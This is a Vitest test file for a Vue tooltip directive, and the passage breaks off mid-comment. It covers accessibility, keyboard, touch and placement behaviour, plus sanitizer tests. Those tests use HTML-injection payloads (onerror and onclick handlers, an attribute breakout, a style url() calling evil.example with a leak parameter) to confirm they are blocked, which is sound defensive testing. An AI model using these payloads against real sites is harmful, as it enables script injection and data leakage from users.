import {
  describe,
  it,
  expect,
  beforeAll,
  beforeEach,
  afterEach,
  vi,
} from 'vitest'
import {
  defineComponent,
  h,
  resolveDirective,
  withDirectives,
  type Directive,
} from 'vue'
import { mount } from '@vue/test-utils'
import tooltipDirective, {
  dismissAllTooltips,
  type ITooltipOptions,
  type TTooltipReason,
} from '@/directives/ToolTip.directive'

/**
 * Reach and accessibility of `v-nb-tooltip`.
 *
 * The lifecycle specs (orphan chips, retriggers, layout thrash) live in
 * tooltip-directive.test.ts. This file covers the part the fleet actually
 * tripped over: a tooltip that only answered to a mouse, on an element that
 * had to be a sidebar link, with no accessible name at the end of it.
 */

const SHOW_DELAY = 400
const HIDE_DELAY = 150
const HIDE_ANIMATION = 200

const chips = () => document.querySelectorAll('span.nb-tooltip')
const chip = () => document.querySelector('span.nb-tooltip') as HTMLElement
/** The persistent, visually hidden node that carries the description text.
 *  It is NOT a chip: it exists from mount and outlives every chip. */
const descNode = () =>
  document.querySelector('span.nb-tooltip-description') as HTMLElement

/** Host applying the directive to an arbitrary tag, which is the whole
 *  point: the affordance must not be welded to one component. */
const Anchor = defineComponent({
  props: {
    opts: {
      type: Object as () => ITooltipOptions | undefined,
      required: false,
      default: undefined,
    },
    tag: { type: String, default: 'button' },
    label: { type: String, default: '' },
    attrs: {
      type: Object as () => Record<string, string>,
      default: () => ({}),
    },
  },
  render() {
    return withDirectives(
      h(this.tag, { id: 'anchor', ...this.attrs }, this.label || undefined),
      [[resolveDirective('nb-tooltip') as Directive, this.opts]],
    )
  },
})

const mountAnchor = (props: Record<string, unknown> = {}) =>
  mount(Anchor, {
    props: { opts: { body: 'Body' }, ...props },
    global: { plugins: [tooltipDirective] },
    attachTo: document.body,
  })

const el = (wrapper: ReturnType<typeof mountAnchor>) =>
  wrapper.element as HTMLElement

/** A pointerdown recorded by the document-level listener. Everything that
 *  distinguishes "the user clicked here" from "the user tabbed here". */
const pointerDown = () =>
  document.dispatchEvent(new Event('pointerdown', { bubbles: true }))

/**
 * Move focus the way a Tab does. The clock is nudged past the pointer grace
 * window first because "was this focus caused by a click?" is answered from
 * the last pointerdown anywhere in the document, and that stamp outlives the
 * test that made it.
 */
const tabTo = (node: HTMLElement) => {
  vi.advanceTimersByTime(1000)
  // The grace window is measured against the wall clock, which the fake
  // timers do not necessarily move, and the stamp is module state that
  // outlives the test that set it. Push the clock past the window explicitly.
  vi.setSystemTime(Date.now() + 1000)
  node.focus()
  node.dispatchEvent(new FocusEvent('focusin', { bubbles: true }))
}

describe('v-nb-tooltip: aria contract', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  it('names an unlabelled control, permanently, not only while visible', () => {
    const wrapper = mountAnchor({ opts: { body: 'Delete environment' } })

    // The name exists before any hover. A name that appears on hover is not
    // a name: a screen-reader user reaching this button by Tab, or listing
    // the buttons on the page, would hear "button".
    expect(el(wrapper).getAttribute('aria-label')).toBe('Delete environment')

    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    // The chip repeats the name, so it must not be announced a second time.
    expect(chip().getAttribute('aria-hidden')).toBe('true')
    expect(chip().hasAttribute('role')).toBe(false)
    expect(el(wrapper).hasAttribute('aria-describedby')).toBe(false)

    wrapper.unmount()
  })

  it('treats a null body as no tooltip, because applications bind nullable state', () => {
    // Stagewright binds `v-nb-tooltip="{ body: projectPath }"` where
    // projectPath is `string | null`. The runtime has always read any falsy
    // value as "nothing to show" via hasContent, but the type rejected null
    // until v-nb-tooltip was type-checked in a consumer for the first time and
    // the disagreement surfaced. The type follows the runtime, not the reverse.
    const wrapper = mountAnchor({
      label: 'Open project',
      opts: { body: null } as ITooltipOptions,
    })

    expect(el(wrapper).hasAttribute('aria-label')).toBe(false)
    expect(el(wrapper).hasAttribute('aria-describedby')).toBe(false)

    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    // No chip, and nothing thrown on the way to deciding that.
    expect(document.querySelector('.nb-tooltip')).toBeNull()

    wrapper.unmount()
  })

  it('describes an already-named control instead of renaming it', () => {
    const wrapper = mountAnchor({
      label: 'Publish',
      opts: { body: 'Pushes this release to the live site' },
    })

    // Auto mode read the button text and chose description.
    expect(el(wrapper).hasAttribute('aria-label')).toBe(false)

    // The description is in the tree BEFORE anything is hovered. This is the
    // whole point: a screen reader computes the description when focus lands,
    // so a reference minted when a chip appears (400ms of hover-intent later)
    // is not there at the moment it is read.
    expect(descNode()).toBeTruthy()
    expect(descNode().textContent).toBe('Pushes this release to the live site')
    expect(descNode().getAttribute('role')).toBe('tooltip')
    expect(el(wrapper).getAttribute('aria-describedby')).toBe(descNode().id)

    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    // The painted chip is a duplicate of text that is already announced, so
    // it is hidden from assistive technology and holds no id of its own.
    expect(chip().getAttribute('aria-hidden')).toBe('true')
    expect(chip().hasAttribute('role')).toBe(false)
    expect(el(wrapper).getAttribute('aria-describedby')).toBe(descNode().id)

    el(wrapper).dispatchEvent(new MouseEvent('mouseleave'))
    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION)

    // The description does not come and go with the chip. It belongs to the
    // binding, and the binding is still there.
    expect(el(wrapper).getAttribute('aria-describedby')).toBe(descNode().id)

    const anchor = el(wrapper)
    const nodeId = descNode().id
    wrapper.unmount()
    // Unmount is the only thing that takes it away, and it takes the node
    // with it: an aria-describedby pointing at a removed id is dropped
    // silently by every screen reader.
    expect(anchor.hasAttribute('aria-describedby')).toBe(false)
    expect(document.getElementById(nodeId)).toBeNull()
  })

  it('has the description in the tree synchronously at focus, not one task later', () => {
    const wrapper = mountAnchor({
      label: 'Publish',
      opts: { body: 'Pushes this release to the live site' },
    })

    // Read the attribute at the instant the focus event is delivered. This is
    // the moment a screen reader computes the description; anything written
    // by a later timer has already missed it.
    let atFocus: string | null = 'not-read'
    el(wrapper).addEventListener('focusin', () => {
      atFocus = el(wrapper).getAttribute('aria-describedby')
    })
    tabTo(el(wrapper))

    expect(atFocus).toBe(descNode().id)
    expect(document.getElementById(atFocus as string)?.textContent).toBe(
      'Pushes this release to the live site',
    )

    wrapper.unmount()
  })

  it('keeps the description text in step with the binding', async () => {
    const wrapper = mountAnchor({
      label: 'Retry',
      opts: { body: '3 attempts left' },
    })
    expect(descNode().textContent).toBe('3 attempts left')

    await wrapper.setProps({ opts: { body: '2 attempts left' } })
    expect(descNode().textContent).toBe('2 attempts left')

    wrapper.unmount()
  })

  it('does not announce twice when the aria mode flips while a chip is up', async () => {
    // Start in description mode on a named control.
    const wrapper = mountAnchor({
      label: 'Publish',
      opts: { body: 'Pushes this release to the live site' },
    })
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(el(wrapper).getAttribute('aria-describedby')).toBe(descNode().id)

    // Flip to label mode with the chip still on screen. The anchor must not
    // end up with a permanent name AND a live description saying the same
    // words: exactly one of the two carries the text.
    await wrapper.setProps({
      opts: {
        body: 'Pushes this release to the live site',
        aria: 'label',
      },
    })

    expect(el(wrapper).getAttribute('aria-label')).toBe(
      'Pushes this release to the live site',
    )
    expect(el(wrapper).hasAttribute('aria-describedby')).toBe(false)
    expect(descNode()).toBeNull()
    expect(chip().getAttribute('aria-hidden')).toBe('true')

    // And back again.
    await wrapper.setProps({
      opts: {
        body: 'Pushes this release to the live site',
        aria: 'description',
      },
    })
    expect(el(wrapper).hasAttribute('aria-label')).toBe(false)
    expect(el(wrapper).getAttribute('aria-describedby')).toBe(descNode().id)

    wrapper.unmount()
  })

  it('strips a competing native title and puts it back on unmount', () => {
    const wrapper = mountAnchor({
      label: 'Publish',
      attrs: { title: 'Publish this release' },
      opts: { body: 'Pushes this release to the live site' },
    })

    // The browser draws its own tooltip from `title`, on its own schedule,
    // over ours, and the accessibility tree takes it as a name or a
    // description depending on what else is there. There is no arrangement
    // where both are wanted.
    expect(el(wrapper).hasAttribute('title')).toBe(false)

    const anchor = el(wrapper)
    wrapper.unmount()
    expect(anchor.getAttribute('title')).toBe('Publish this release')
  })

  it('names an icon control whose only name was its native title', () => {
    // With the title stripped, nothing else names this button, so auto mode
    // must resolve to `label` rather than leaving it anonymous.
    const wrapper = mountAnchor({
      attrs: { title: 'Delete' },
      opts: { body: 'Delete environment' },
    })
    expect(el(wrapper).hasAttribute('title')).toBe(false)
    expect(el(wrapper).getAttribute('aria-label')).toBe('Delete environment')
    expect(descNode()).toBeNull()
    wrapper.unmount()
  })

  it('never overwrites a name the consumer set', () => {
    const wrapper = mountAnchor({
      attrs: { 'aria-label': 'Close panel' },
      opts: { body: 'Esc also works' },
    })

    expect(el(wrapper).getAttribute('aria-label')).toBe('Close panel')

    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(el(wrapper).getAttribute('aria-describedby')).toBe(descNode().id)

    wrapper.unmount()
  })

  it('preserves an existing aria-describedby alongside its own', () => {
    const wrapper = mountAnchor({
      label: 'Amount',
      attrs: { 'aria-describedby': 'field-error' },
      opts: { body: 'Gross, before tax' },
    })

    // A field can be described by both its error message and its tooltip.
    expect(el(wrapper).getAttribute('aria-describedby')).toBe(
      `field-error ${descNode().id}`,
    )

    const anchor = el(wrapper)
    wrapper.unmount()
    expect(anchor.getAttribute('aria-describedby')).toBe('field-error')
  })

  it('follows the content when the label changes', async () => {
    const wrapper = mountAnchor({ opts: { body: 'Mute' } })
    expect(el(wrapper).getAttribute('aria-label')).toBe('Mute')

    await wrapper.setProps({ opts: { body: 'Unmute' } })
    expect(el(wrapper).getAttribute('aria-label')).toBe('Unmute')

    wrapper.unmount()
  })

  it('flattens header, body and tip into one announceable name', () => {
    const wrapper = mountAnchor({
      opts: {
        header: 'Retry',
        body: '<strong>3</strong> attempts left',
        tip: 'Shift-click to force',
      },
    })
    expect(el(wrapper).getAttribute('aria-label')).toBe(
      'Retry. 3 attempts left. Shift-click to force',
    )
    wrapper.unmount()
  })

  it('honours aria: none and leaves the DOM untouched', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', aria: 'none' } })
    expect(el(wrapper).hasAttribute('aria-label')).toBe(false)

    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(el(wrapper).hasAttribute('aria-describedby')).toBe(false)
    expect(chip().getAttribute('aria-hidden')).toBe('true')

    wrapper.unmount()
  })

  it('removes the name it owns when the anchor unmounts', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body' } })
    const node = el(wrapper)
    expect(node.getAttribute('aria-label')).toBe('Body')
    wrapper.unmount()
    expect(node.hasAttribute('aria-label')).toBe(false)
  })
})

describe('v-nb-tooltip: keyboard', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  it('opens on focus with no hover, and without the hover-intent delay', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', position: 'top' } })
    tabTo(el(wrapper))

    // A keyboard user has already committed by moving focus; making them
    // hold still for 400ms is a hover affordance leaking into keyboard.
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)

    el(wrapper).dispatchEvent(new FocusEvent('focusout', { bubbles: true }))
    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION)
    expect(chips().length).toBe(0)

    wrapper.unmount()
  })

  it('does not open when focus arrives from a click', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body' } })
    pointerDown()
    el(wrapper).dispatchEvent(new FocusEvent('focusin', { bubbles: true }))
    vi.advanceTimersByTime(SHOW_DELAY + 1)

    // Otherwise every icon button in a toolbar leaves a chip parked over the
    // menu or panel the click just opened.
    expect(chips().length).toBe(0)
    wrapper.unmount()
  })

  it('survives the watchdog while focus stays on the anchor', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body' } })
    tabTo(el(wrapper))
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)

    // The self-reaping watchdog checks :hover, which a focused anchor never
    // matches. Five ticks is well past the two-miss reap threshold.
    vi.advanceTimersByTime(5000)
    expect(chips().length).toBe(1)

    wrapper.unmount()
  })

  it('closes on Escape without stealing the key', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body' } })
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    expect(chips().length).toBe(1)

    const event = new KeyboardEvent('keydown', {
      key: 'Escape',
      bubbles: true,
      cancelable: true,
    })
    document.dispatchEvent(event)
    vi.advanceTimersByTime(1)

    expect(chips().length).toBe(0)
    // The dialog or menu underneath still gets its Escape.
    expect(event.defaultPrevented).toBe(false)

    wrapper.unmount()
  })

  it('makes a non-interactive anchor reachable only when asked', () => {
    const plain = mountAnchor({ tag: 'span', opts: { body: 'Body' } })
    expect(el(plain).hasAttribute('tabindex')).toBe(false)
    plain.unmount()

    const reachable = mountAnchor({
      tag: 'span',
      opts: { body: 'Truncated value', focusable: true },
    })
    expect(el(reachable).getAttribute('tabindex')).toBe('0')

    const node = el(reachable)
    reachable.unmount()
    // We added the tab stop, so we take it away again.
    expect(node.hasAttribute('tabindex')).toBe(false)
  })

  it('does not add a tab stop to something already focusable', () => {
    const wrapper = mountAnchor({
      opts: { body: 'Body', focusable: true },
    })
    expect(el(wrapper).hasAttribute('tabindex')).toBe(false)
    wrapper.unmount()
  })
})

describe('v-nb-tooltip: touch', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  it('opens on tap and closes itself, since no pointer ever leaves', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body' } })
    el(wrapper).dispatchEvent(new Event('touchstart', { bubbles: true }))
    vi.advanceTimersByTime(1)
    expect(chips().length).toBe(1)

    vi.advanceTimersByTime(4000 + HIDE_ANIMATION)
    expect(chips().length).toBe(0)
    wrapper.unmount()
  })

  it('ignores the synthetic mouseenter a tap replays', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body' } })
    el(wrapper).dispatchEvent(new Event('touchstart', { bubbles: true }))
    vi.advanceTimersByTime(1)

    // Real touchscreen browsers fire mouseenter right after touchstart. If we
    // honoured it, the chip would reopen with no mouseleave ever coming.
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(4000 + HIDE_ANIMATION)
    expect(chips().length).toBe(0)

    wrapper.unmount()
  })

  it('can be opted out of for controls where tap means something else', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', touch: false } })
    el(wrapper).dispatchEvent(new Event('touchstart', { bubbles: true }))
    vi.advanceTimersByTime(SHOW_DELAY + 1)
    expect(chips().length).toBe(0)
    wrapper.unmount()
  })
})

describe('v-nb-tooltip: placement and motion', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  it('anchors to the element when there is no cursor to follow', () => {
    // Default position is `cursor`. A focus or touch show has no cursor, so
    // the chip would render at the viewport origin.
    const wrapper = mountAnchor({ opts: { body: 'Body' } })
    tabTo(el(wrapper))
    vi.advanceTimersByTime(1)

    expect(chip().classList.contains('nb-tooltip-cursor')).toBe(false)
    expect(chip().classList.contains('nb-tooltip-top')).toBe(true)
    wrapper.unmount()
  })

  it('keeps an explicit side on a focus show', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', position: 'right' } })
    tabTo(el(wrapper))
    vi.advanceTimersByTime(1)
    expect(chip().classList.contains('nb-tooltip-right')).toBe(true)
    wrapper.unmount()
  })

  it('respects a longer hideDelay', () => {
    const wrapper = mountAnchor({ opts: { body: 'Body', hideDelay: 600 } })
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    el(wrapper).dispatchEvent(new MouseEvent('mouseleave'))

    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION)
    expect(chips().length).toBe(1)

    vi.advanceTimersByTime(600 + HIDE_ANIMATION)
    expect(chips().length).toBe(0)
    wrapper.unmount()
  })

  it('drops the fade entirely under prefers-reduced-motion', () => {
    // jsdom ships no matchMedia at all, so the directive's reduced-motion
    // probe has to be resilient to that too (it is: prefersReducedMotion
    // returns false when the API is missing).
    vi.stubGlobal(
      'matchMedia',
      (query: string) =>
        ({
          matches: query.includes('prefers-reduced-motion'),
          media: query,
          addEventListener: () => {},
          removeEventListener: () => {},
        }) as unknown as MediaQueryList,
    )

    const wrapper = mountAnchor({ opts: { body: 'Body' } })
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    expect(chip().style.animation).toBe('')
    expect(chip().style.opacity).toBe('1')

    // And the exit is a removal, not a fade-out that has to be waited for.
    el(wrapper).dispatchEvent(new MouseEvent('mouseleave'))
    vi.advanceTimersByTime(HIDE_DELAY)
    expect(chips().length).toBe(0)

    wrapper.unmount()
    vi.unstubAllGlobals()
  })
})

// ── Geometry ─────────────────────────────────────────────────────────────
//
// jsdom performs no layout, so every rect is zero unless it is stubbed. These
// specs stub the ANCHOR's rect only (the chip keeps its zero box, which is
// what the directive's own `width > 0` guards are for) and assert the
// coordinates the directive writes, which is the only part of placement that
// is ours rather than the browser's.

type TRect = { top: number; left: number; width: number; height: number }

const stubbedRects = new WeakMap<Element, TRect>()
let realGetRect: () => DOMRect

const setRect = (node: Element, rect: TRect) => stubbedRects.set(node, rect)

const installRectStub = () => {
  realGetRect = Element.prototype.getBoundingClientRect
  Element.prototype.getBoundingClientRect = function (this: Element) {
    const r = stubbedRects.get(this) ?? { top: 0, left: 0, width: 0, height: 0 }
    return {
      ...r,
      bottom: r.top + r.height,
      right: r.left + r.width,
      x: r.left,
      y: r.top,
      toJSON: () => r,
    } as DOMRect
  }
}

const restoreRectStub = () => {
  Element.prototype.getBoundingClientRect = realGetRect
}

describe('v-nb-tooltip: the chip follows its anchor', () => {
  let container: HTMLDivElement

  beforeEach(() => {
    vi.useFakeTimers()
    installRectStub()
    // A scroll container, which is what a Shell panel, an inspector body and
    // a scrolled table are. Its scroll event does not bubble.
    container = document.createElement('div')
    container.style.overflow = 'auto'
    document.body.appendChild(container)
  })

  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    restoreRectStub()
    document.body.innerHTML = ''
  })

  const open = (opts: ITooltipOptions = { body: 'Body', position: 'top' }) => {
    const wrapper = mount(Anchor, {
      props: { opts },
      global: { plugins: [tooltipDirective] },
      attachTo: container,
    })
    const node = wrapper.element as HTMLElement
    setRect(node, { top: 300, left: 100, width: 40, height: 20 })
    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    return { wrapper, node }
  }

  it('re-anchors when an INNER scroll container scrolls, not just the window', () => {
    const { wrapper, node } = open()
    // top placement, 4px gap doubled: the chip sits 8px above the anchor.
    expect(chip().style.top).toBe('292px')

    // The panel scrolls by 100px. `scroll` does not bubble, so a
    // window-level, bubble-phase listener (what this directive used to have)
    // hears nothing here and the chip stays where it was born while its
    // trigger slides away. Every tooltip in a shell panel had this bug.
    setRect(node, { top: 200, left: 100, width: 40, height: 20 })
    container.dispatchEvent(new Event('scroll'))

    expect(chip().style.top).toBe('192px')
    wrapper.unmount()
  })

  it('re-anchors on window resize', () => {
    const { wrapper, node } = open()
    setRect(node, { top: 300, left: 260, width: 40, height: 20 })
    window.dispatchEvent(new Event('resize'))

    // left = anchor.left + width/2 - (chipWidth/2 + gap/2)
    expect(chip().style.left).toBe('278px')
    wrapper.unmount()
  })

  it('re-anchors when the anchor moves with no event at all', () => {
    const { wrapper, node } = open()
    // A collapsing sidebar, a row animating in, a font swap: the anchor moves
    // and nothing fires. The per-frame rect check is the only thing that
    // catches this.
    setRect(node, { top: 120, left: 100, width: 40, height: 20 })
    vi.advanceTimersByTime(64)

    expect(chip().style.top).toBe('112px')
    wrapper.unmount()
  })

  it('takes the chip down when the anchor scrolls out of sight', () => {
    const { wrapper, node } = open()
    expect(chips().length).toBe(1)

    setRect(node, { top: -400, left: 100, width: 40, height: 20 })
    container.dispatchEvent(new Event('scroll'))

    // Not repositioned to the top edge: a chip whose anchor is gone is
    // pointing at unrelated content.
    expect(chips().length).toBe(0)
    wrapper.unmount()
  })

  it("ignores the anchor's OWN scroll offset", () => {
    // `getBoundingClientRect` is already viewport-relative and the chip is
    // `position: fixed`, so the correct scroll subtraction is zero. Reading
    // the anchor's `scrollTop` (its internal content offset) displaced the
    // chip by that amount for any anchor that was itself a scroll container:
    // a truncated cell, a code block, anything with `overflow: auto`.
    const wrapper = mount(Anchor, {
      props: { opts: { body: 'Body', position: 'top' } },
      global: { plugins: [tooltipDirective] },
      attachTo: container,
    })
    const node = wrapper.element as HTMLElement
    Object.defineProperty(node, 'scrollTop', { value: 120, writable: false })
    Object.defineProperty(node, 'scrollLeft', { value: 60, writable: false })
    setRect(node, { top: 300, left: 100, width: 40, height: 20 })

    node.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    expect(chip().style.top).toBe('292px')
    expect(chip().style.left).toBe('118px')
    wrapper.unmount()
  })

  it('stops listening once the last chip is gone', () => {
    const add = vi.spyOn(document, 'addEventListener')
    const remove = vi.spyOn(document, 'removeEventListener')
    const { wrapper, node } = open()

    expect(
      add.mock.calls.some(
        ([type, , options]) =>
          type === 'scroll' &&
          typeof options === 'object' &&
          options?.capture === true,
      ),
    ).toBe(true)

    node.dispatchEvent(new MouseEvent('mouseleave'))
    vi.advanceTimersByTime(HIDE_DELAY + HIDE_ANIMATION)

    // The subscription is per-live-chip, not per-app: a page with a thousand
    // tooltip anchors and none open holds zero listeners and no frame loop.
    expect(remove.mock.calls.some(([type]) => type === 'scroll')).toBe(true)
    add.mockRestore()
    remove.mockRestore()
    wrapper.unmount()
  })
})

// ── Nesting ──────────────────────────────────────────────────────────────

/** A tooltip on a wrapper AND on the control inside it. The docs used to
 *  recommend the wrapper form, and a single Tab opened both chips. */
const Nested = defineComponent({
  props: {
    outer: { type: Object as () => ITooltipOptions, required: true },
    inner: { type: Object as () => ITooltipOptions, required: true },
  },
  render() {
    return withDirectives(
      h('div', { id: 'outer' }, [
        withDirectives(h('button', { id: 'inner' }), [
          [resolveDirective('nb-tooltip') as Directive, this.inner],
        ]),
      ]),
      [[resolveDirective('nb-tooltip') as Directive, this.outer]],
    )
  },
})

describe('v-nb-tooltip: nested anchors', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  const mountNested = () =>
    mount(Nested, {
      props: { outer: { body: 'Outer' }, inner: { body: 'Inner' } },
      global: { plugins: [tooltipDirective] },
      attachTo: document.body,
    })

  it('opens exactly one chip on a single focus, the innermost', () => {
    const wrapper = mountNested()
    const inner = document.getElementById('inner') as HTMLElement

    // focusin bubbles, which is what makes a tooltip on a wrapper work at
    // all, and what used to make both chips open on top of each other.
    tabTo(inner)
    vi.advanceTimersByTime(SHOW_DELAY)

    expect(chips().length).toBe(1)
    expect(chip().textContent).toContain('Inner')
    wrapper.unmount()
  })

  it('opens exactly one chip on hover, the innermost', () => {
    const wrapper = mountNested()
    const outer = document.getElementById('outer') as HTMLElement
    const inner = document.getElementById('inner') as HTMLElement

    // mouseenter does NOT bubble, so both elements get their own event as the
    // pointer crosses into the wrapper and then into the button.
    outer.dispatchEvent(new MouseEvent('mouseenter'))
    inner.dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)

    expect(chips().length).toBe(1)
    expect(chip().textContent).toContain('Inner')
    wrapper.unmount()
  })

  it('opens exactly one chip on a tap, the innermost', () => {
    const wrapper = mountNested()
    const inner = document.getElementById('inner') as HTMLElement

    inner.dispatchEvent(new Event('touchstart', { bubbles: true }))
    vi.advanceTimersByTime(1)

    expect(chips().length).toBe(1)
    expect(chip().textContent).toContain('Inner')
    wrapper.unmount()
  })
})

// ── Structured content ───────────────────────────────────────────────────

describe('v-nb-tooltip: structured content is not an HTML escape hatch', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  const openWith = (opts: ITooltipOptions) => {
    const wrapper = mountAnchor({ opts })
    el(wrapper).dispatchEvent(new MouseEvent('mouseenter'))
    vi.advanceTimersByTime(SHOW_DELAY)
    return wrapper
  }

  it('drops a tag outside the allowlist and keeps its text', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const wrapper = openWith({
      body: [
        {
          component: 'img',
          props: { src: 'x', onerror: 'globalThis.__pwned__ = true' },
          content: 'Signed by Ada',
        } as never,
      ],
    })

    // The node came from a caller: a CMS field, an API payload, a column
    // formatter. Interpolating its tag name and prop keys is a live handler
    // inside innerHTML.
    expect(chip().querySelector('img')).toBeNull()
    expect(chip().innerHTML).not.toContain('onerror')
    // The words survive: a rejected wrapper must not silently delete text.
    expect(chip().textContent).toContain('Signed by Ada')
    warn.mockRestore()
    wrapper.unmount()
  })

  it('drops a prop outside the allowlist but keeps the element', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const wrapper = openWith({
      body: [
        {
          component: 'span',
          props: { class: 'muted', onclick: 'steal()', id: 'nb-tooltip-1' },
          content: 'Ada',
        } as never,
      ],
    })

    const span = chip().querySelector('span.muted') as HTMLElement
    expect(span).not.toBeNull()
    expect(span.hasAttribute('onclick')).toBe(false)
    // `id` is refused too: a caller-supplied id can collide with the chip id
    // that aria-describedby points at.
    expect(span.hasAttribute('id')).toBe(false)
    warn.mockRestore()
    wrapper.unmount()
  })

  it('drops a class value that tries to close its own attribute', () => {
    const wrapper = openWith({
      body: [
        {
          component: 'span',
          props: { class: 'a" onmouseover="steal()' },
          content: 'x',
        } as never,
      ],
    })

    const span = chip().querySelector('span') as HTMLElement
    expect(span.hasAttribute('onmouseover')).toBe(false)
    // Escaping alone would have kept the whole string as a (harmless but
    // absurd) class value. The token filter rejects every part of it, and a
    // prop whose value filters away to nothing leaves no attribute at all.
    expect(span.hasAttribute('class')).toBe(false)
    expect(chip().innerHTML).not.toContain('onmouseover')
    wrapper.unmount()
  })

  it('keeps ordinary class tokens', () => {
    const wrapper = openWith({
      body: [
        { component: 'span', props: { class: 'muted em-1' }, content: 'x' },
      ],
    })
    expect(chip().querySelector('span')!.getAttribute('class')).toBe(
      'muted em-1',
    )
    wrapper.unmount()
  })

  // ── The hole the docs used to deny ─────────────────────────────────────
  //
  // A caller-supplied STRING body used to be handed to the library's shared
  // escape helper, which passes `<p style="..." class="...">` through with
  // its attribute values untouched. Neither payload below contains a single
  // character that HTML escaping would alter, which is exactly why escaping
  // was not a defence: `url()` is an outbound request (a read receipt for
  // whoever wrote the CMS field) and `position: fixed; inset: 0` is a
  // full-viewport click shield wearing a tooltip's name.

  it('does not let a string body smuggle a remote request through style', () => {
    const wrapper = openWith({
      body: '<p style="background-image:url(https://evil.example/?leak=1)">boom</p>',
    })
    // No element in the chip carries a style attribute at all: the tag was
    // not recognised as an allowed BARE tag, so the whole token is text.
    expect(chip().querySelector('[style]')).toBeNull()
    // It shows up as the literal characters the author wrote, escaped.
    expect(chip().innerHTML).toContain('&lt;p style=')
    // The words survive as text: a rejected attribute must not eat the copy.
    expect(chip().textContent).toContain('boom')
    wrapper.unmount()
  })

  it('does not let a string body position anything, or borrow app classes', () => {
    const wrapper = openWith({
      body: '<p style="position:fixed;inset:0" class="nb-modal">boom</p>',
    })
    // Nothing inside the chip content is positioned or wearing a library
    // class it was handed. `.nb-tooltip-content` and friends are the chip's
    // own scaffolding, so the query is scoped to the body cell.
    const body = chip().querySelector('.nb-tooltip-body') as HTMLElement
    expect(body.querySelector('[class]')).toBeNull()
    expect(body.querySelector('[style]')).toBeNull()
    expect(body.textContent).toContain('boom')
    wrapper.unmount()
  })

  it('keeps the emphasis a string body is actually for', () => {
    const wrapper = openWith({ body: 'a<br><strong>b</strong>\nc' })
    expect(chip().querySelector('strong')!.textContent).toBe('b')
    // Newlines still become breaks: one for the literal <br>, one for the \n.
    expect(chip().querySelectorAll('br').length).toBe(2)
    wrapper.unmount()
  })

  it('shows a tag outside the string allowlist as text rather than markup', () => {
    const wrapper = openWith({ body: '<img src=x onerror=steal()>after' })
    expect(chip().querySelector('img')).toBeNull()
    const body = chip().querySelector('.nb-tooltip-body') as HTMLElement
    // Not one element: the whole tag is a text node now.
    expect(body.children.length).toBe(0)
    expect(body.textContent).toContain('<img src=x onerror=steal()>')
    expect(body.textContent).toContain('after')
    wrapper.unmount()
  })

  it('rejects a style declaration the allowlist does not name, keeping the rest', () => {
    const wrapper = openWith({
      body: [
        {
          component: 'span',
          props: { style: 'font-weight: 700; position: fixed' },
          content: 'x',
        },
      ],
    })
    const style = chip().querySelector('span')!.getAttribute('style')
    expect(style).toBe('font-weight: 700')
    wrapper.unmount()
  })
})

// ── Naming a non-interactive anchor ──────────────────────────────────────

describe('v-nb-tooltip: label mode on an element with no role', () => {
  beforeEach(() => vi.useFakeTimers())
  afterEach(() => {
    vi.clearAllTimers()
    vi.useRealTimers()
    document.body.innerHTML = ''
  })

  it('gives a bare span a role that can carry the name', () => {
    // `aria-label` is prohibited on a generic element and is announced
    // inconsistently or not at all. A status dot labelled that way would tell
    // a screen-reader user nothing, which is the exact failure this directive
